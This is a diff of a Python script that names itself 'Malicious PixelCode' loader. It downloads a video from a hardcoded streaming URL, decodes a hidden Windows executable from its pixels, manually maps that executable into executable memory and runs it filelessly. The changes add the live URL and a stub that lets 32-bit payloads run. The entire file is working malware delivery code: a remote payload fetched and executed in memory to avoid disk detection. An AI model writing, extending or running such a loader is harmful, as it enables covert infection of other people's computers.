@@ -1,7 +1,10 @@
 #!/usr/bin/env python3
 """
-Malicious PixelCode - Complete Python Loader (Fixed for 32-bit)
-Downloads video, extracts hidden PE, and executes it in memory.
+Malicious PixelCode - Complete Python Loader with Embedded URL
+- Downloads video from hardcoded URL
+- Extracts payload via pixel decoding
+- Maps and executes payload in memory (fileless)
+- Fixed for 32-bit PEs with _except_handler3 support
 """
 
 import cv2
@@ -17,26 +20,34 @@ import pefile
 
 # ===================== CONFIGURATION =====================
 # Hardcode your video URL here (direct link to the PixelCode video)
-VIDEO_URL = "https://example.com/pixelcode_video.mp4"   # <-- REPLACE WITH YOUR URL
+VIDEO_URL = "https://rr1---sn-uxaxjvhxbt2u-5aty.googlevideo.com/videoplayback?expire=1763582759&ei=x84daeagLvWZhcIPktXbqQ4&ip=154.184.125.171&id=o-AF9TPIQdwLkiiqul_xsDxAfh92OIc6tFdHySWHZ3nAFV&itag=137&source=youtube&requiressl=yes&xpc=EgVo2aDSNQ%3D%3D&cps=12&met=1763561159%2C&mh=DX&mm=31%2C29&mn=sn-uxaxjvhxbt2u-5aty%2Csn-hgn7rn7k&ms=au%2Crdu&mv=m&mvi=1&pl=15&rms=au%2Cau&initcwndbps=317500&bui=AdEuB5TsU9PNExUdj_b9bfgYxLk_IYW-ysNGRTGBD5UQOnX-PtTsRMLcTktOInO6OO321AeCm4HO26l-&spc=6b0G_Nvh-_I2rKaUeyG6lmO5RjgYwk6ZaQ-ypWxWqJ7_yuy82C3Ti8tB&vprv=1&svpuc=1&mime=video%2Fmp4&rqh=1&gir=yes&clen=1454012&dur=1.541&lmt=1763561120035836&mt=1763560940&fvip=2&keepalive=yes&fexp=51552689%2C51565115%2C51565682%2C51580968&c=ANDROID_VR&txp=6209224&sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cxpc%2Cbui%2Cspc%2Cvprv%2Csvpuc%2Cmime%2Crqh%2Cgir%2Cclen%2Cdur%2Clmt&sig=AJfQdSswRQIgGvn4BbD2astn6A_KgVtjJ80ei5zCCyqpF9Q5hGERtuQCIQDS_9_MGZ1vtarmkR3FRyuMAGZs2sUk7RC8a5udvxmRuw%3D%3D&lsparams=cps%2Cmet%2Cmh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Crms%2Cinitcwndbps&lsig=APaTxxMwRgIhAN8I3gYtsYvLBLVNw9pf55OGNlrt3dDNQlHjRGurwG-dAiEA9Yu2ghHsQfMlm61EzfBF32ee8FJQRieFBpbhEAG-DAk%3D"
 
-# Pixel decoding parameters (must match the encoder)
-PIXEL_SIZE           = 4
-WHITE_IS_ZERO        = True
+# Pixel decoding parameters (match the encoding settings)
+PIXEL_SIZE = 4
+WHITE_IS_ZERO = True
 BRIGHTNESS_THRESHOLD = 180
 
 # Execution control
-EXECUTE_PAYLOAD      = True   # Set to False to only map (debug)
-SAVE_PAYLOAD         = False  # Save extracted PE to disk for analysis
+EXECUTE_PAYLOAD = True   # Set to False to only extract and map (debug)
+SAVE_PAYLOAD = False     # Save extracted PE to disk for analysis
 # ==========================================================
 
+# Exception handler stub for 32-bit PEs
+# xor eax, eax; ret (simple stub that returns 0)
+EXCEPTION_STUB = bytes([
+    0x31, 0xC0,  # xor eax, eax
+    0xC3         # ret
+])
+
 def download_video(url):
-    """Download video from URL to a temporary file."""
-    print(f"[*] Downloading from: {url}")
+    """Download video from URL to a temporary file and return the file path."""
+    print(f"[*] Downloading video from: {url}")
     try:
         response = requests.get(url, stream=True)
         response.raise_for_status()
         total_size = int(response.headers.get('content-length', 0))
 
+        # Create a temporary file
         fd, temp_path = tempfile.mkstemp(suffix='.mp4')
         os.close(fd)
 
@@ -45,7 +56,6 @@ def download_video(url):
                 for chunk in response.iter_content(chunk_size=8192):
                     f.write(chunk)
                     pbar.update(len(chunk))
-
         print(f"[+] Video downloaded to temporary file: {temp_path}")
         return temp_path
     except Exception as e:
@@ -112,20 +122,33 @@ def extract_payload(video_path):
     print(f"[+] Reconstructed payload: {len(payload):,} bytes")
     return bytes(payload)
 
-def map_and_run_pe(raw_pe: bytes, execute_thread=True, save_payload=False):
-    """Manually map PE into memory and execute (supports 32/64-bit)."""
+def find_stub_location(pe, base_addr):
+    """Find a safe location to place the exception handler stub."""
+    # Try to put it at the end of the .text section
+    for sec in pe.sections:
+        sec_name = sec.Name.decode('utf-8', errors='ignore').strip('\x00')
+        if '.text' in sec_name or 'CODE' in sec_name:
+            # Place stub at the end of the section
+            stub_addr = base_addr + sec.VirtualAddress + sec.Misc_VirtualSize - 16
+            return stub_addr
+    
+    # Fallback: use a location after all sections
+    last_section = max(pe.sections, key=lambda s: s.VirtualAddress + s.Misc_VirtualSize)
+    stub_addr = base_addr + last_section.VirtualAddress + last_section.Misc_VirtualSize + 0x1000
+    return stub_addr
+
+def map_and_run_pe(raw_pe):
+    """Manually map PE into memory and optionally execute its entry point."""
     if sys.platform != "win32":
         print("[!] This code requires Windows")
         return
 
-    if save_payload:
+    if SAVE_PAYLOAD:
         with open("extracted_payload.exe", "wb") as f:
             f.write(raw_pe)
-        print(f"[+] Payload saved to extracted_payload.exe")
+        print("[+] Payload saved to extracted_payload.exe")
 
     kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
-
-    # Function prototypes
     kernel32.VirtualAlloc.restype = ctypes.c_void_p
     kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
     kernel32.VirtualProtect.restype = ctypes.c_bool
@@ -145,9 +168,6 @@ def map_and_run_pe(raw_pe: bytes, execute_thread=True, save_payload=False):
     MEM_COMMIT = 0x1000
     MEM_RESERVE = 0x2000
     PAGE_EXECUTE_READWRITE = 0x40
-    PAGE_READWRITE = 0x04
-    PAGE_EXECUTE_READ = 0x20
-    PAGE_READONLY = 0x02
     MEM_RELEASE = 0x8000
 
     try:
@@ -156,24 +176,20 @@ def map_and_run_pe(raw_pe: bytes, execute_thread=True, save_payload=False):
         print(f"[!] PE parsing failed: {e}")
         return
 
-    is_64bit = pe.FILE_HEADER.Machine == 0x8664  # IMAGE_FILE_MACHINE_AMD64
+    is_64bit = pe.FILE_HEADER.Machine == 0x8664
     print(f"[i] PE architecture: {'64-bit' if is_64bit else '32-bit'}")
-
     image_base = pe.OPTIONAL_HEADER.ImageBase
     image_size = pe.OPTIONAL_HEADER.SizeOfImage
     print(f"[i] ImageBase: 0x{image_base:X}   SizeOfImage: {image_size:,}")
 
-    # Allocate memory with RWX
     base_addr = kernel32.VirtualAlloc(None, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
     if not base_addr:
         print(f"[!] VirtualAlloc failed (err {ctypes.get_last_error()})")
         return
     print(f"[+] Allocated at 0x{base_addr:X}")
 
-    # Copy PE headers
+    # Copy headers and sections
     ctypes.memmove(base_addr, raw_pe, pe.OPTIONAL_HEADER.SizeOfHeaders)
-
-    # Copy sections
     for sec in pe.sections:
         dest = base_addr + sec.VirtualAddress
         src_data = raw_pe[sec.PointerToRawData : sec.PointerToRawData + sec.SizeOfRawData]
@@ -199,18 +215,23 @@ def map_and_run_pe(raw_pe: bytes, execute_thread=True, save_payload=False):
                     rtype = entry >> 12
                     roff = entry & 0xFFF
                     addr = base_addr + block_rva + roff
-
-                    if rtype == 10:  # IMAGE_REL_BASED_DIR64 (64-bit)
-                        if is_64bit:
-                            val = int.from_bytes(ctypes.string_at(addr, 8), "little") + delta
-                            ctypes.memmove(addr, val.to_bytes(8, "little"), 8)
-                    elif rtype == 3:  # IMAGE_REL_BASED_HIGHLOW (32-bit)
-                        if not is_64bit:
-                            val = int.from_bytes(ctypes.string_at(addr, 4), "little") + delta
-                            ctypes.memmove(addr, val.to_bytes(4, "little"), 4)
+                    if rtype == 10 and is_64bit:      # DIR64
+                        val = int.from_bytes(ctypes.string_at(addr, 8), "little") + delta
+                        ctypes.memmove(addr, val.to_bytes(8, "little"), 8)
+                    elif rtype == 3 and not is_64bit: # HIGHLOW
+                        val = int.from_bytes(ctypes.string_at(addr, 4), "little") + delta
+                        ctypes.memmove(addr, val.to_bytes(4, "little"), 4)
 
     # Imports
     print("[i] Resolving imports")
+    
+    # For 32-bit PEs, place exception handler stub if needed
+    stub_addr = None
+    if not is_64bit:
+        stub_addr = find_stub_location(pe, base_addr)
+        ctypes.memmove(stub_addr, EXCEPTION_STUB, len(EXCEPTION_STUB))
+        print(f"[i] Exception handler stub placed at 0x{stub_addr:X}")
+    
     if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
         for entry in pe.DIRECTORY_ENTRY_IMPORT:
             dll_name = entry.dll.decode('utf-8') if isinstance(entry.dll, bytes) else entry.dll
@@ -219,27 +240,36 @@ def map_and_run_pe(raw_pe: bytes, execute_thread=True, save_payload=False):
                 print(f"[!] LoadLibraryA failed for {dll_name}")
                 kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
                 return
+            
             for imp in entry.imports:
                 if imp.name:
                     func_name = imp.name.decode('utf-8') if isinstance(imp.name, bytes) else imp.name
+                    
+                    # Special handling for _except_handler3 in 32-bit PEs
+                    if not is_64bit and func_name == "_except_handler3":
+                        print(f"[i] Using stub for {func_name}")
+                        iat_addr = base_addr + imp.address - image_base
+                        ctypes.memmove(iat_addr, (stub_addr & 0xFFFFFFFF).to_bytes(4, "little"), 4)
+                        continue
+                    
+                    # Normal function resolution
                     func = kernel32.GetProcAddress(dll, func_name.encode('utf-8'))
                     if not func:
                         print(f"[!] GetProcAddress failed: {func_name}")
                         kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
                         return
-
+                    
                     # Write function address with correct size
                     iat_addr = base_addr + imp.address - image_base
                     if is_64bit:
                         ctypes.memmove(iat_addr, ctypes.c_void_p(func).value.to_bytes(8, "little"), 8)
                     else:
-                        # 32-bit: truncate to 4 bytes
                         func_addr = ctypes.c_void_p(func).value
                         if func_addr > 0xFFFFFFFF:
                             print(f"[!] Warning: Function address 0x{func_addr:X} too large for 32-bit")
                         ctypes.memmove(iat_addr, (func_addr & 0xFFFFFFFF).to_bytes(4, "little"), 4)
 
-    # TLS callbacks (optional)
+    # TLS callbacks (simplified)
     tls_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_TLS']]
     if tls_dir.Size:
         try:
@@ -249,22 +279,17 @@ def map_and_run_pe(raw_pe: bytes, execute_thread=True, save_payload=False):
                 for cb_rva in tls.callbacks:
                     cb_addr = base_addr + cb_rva - image_base
                     print(f"  → Calling TLS callback at 0x{cb_addr:X}")
-                    try:
-                        callback = ctypes.CFUNCTYPE(None)(cb_addr)
-                        callback()
-                    except Exception as e:
-                        print(f"  → TLS callback failed: {e}")
+                    callback = ctypes.CFUNCTYPE(None)(cb_addr)
+                    callback()
         except Exception as e:
-            print(f"[!] Error processing TLS: {e}")
+            print(f"[!] TLS error: {e}")
 
-    # Entry point
     entry_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
     entry_addr = base_addr + entry_rva
     print(f"[+] Entry point: 0x{entry_addr:X}")
 
-    if not execute_thread:
-        print("\n[DEBUG MODE] Thread creation skipped. Mapping completed.")
-        print(f"Memory is ready at 0x{base_addr:X} – you may attach debugger now.")
+    if not EXECUTE_PAYLOAD:
+        print("\n[DEBUG] Execution skipped. Memory mapped at 0x{base_addr:X}")
         input("Press Enter to free memory and exit...")
         kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
         return
@@ -280,22 +305,22 @@ def map_and_run_pe(raw_pe: bytes, execute_thread=True, save_payload=False):
     print(f"[+] Thread started (TID {tid.value}) → waiting...")
     kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)
     print("[+] Thread finished")
-
     kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
 
 def main():
-    print("Malicious PixelCode - Fixed Loader")
+    print("Malicious PixelCode - Fixed Loader with Exception Handler Support")
     print("=" * 60)
+    print(f"[*] Using hardcoded URL")
 
-    # Download video
+    # Step 1: Download video to temp file
     video_path = download_video(VIDEO_URL)
     if not video_path:
         sys.exit(1)
 
-    # Extract payload
+    # Step 2: Extract payload
     payload = extract_payload(video_path)
 
-    # Delete temporary video
+    # Step 3: Clean up temp video
     try:
         os.unlink(video_path)
         print("[+] Temporary video deleted")
@@ -306,9 +331,9 @@ def main():
         print("[!] Extraction failed")
         sys.exit(1)
 
-    # Map and execute
+    # Step 4: Map and execute payload
     print("\n[*] Starting manual mapping...")
-    map_and_run_pe(payload, execute_thread=EXECUTE_PAYLOAD, save_payload=SAVE_PAYLOAD)
+    map_and_run_pe(payload)
     print("\n[+] All done.")
 
 if __name__ == "__main__":
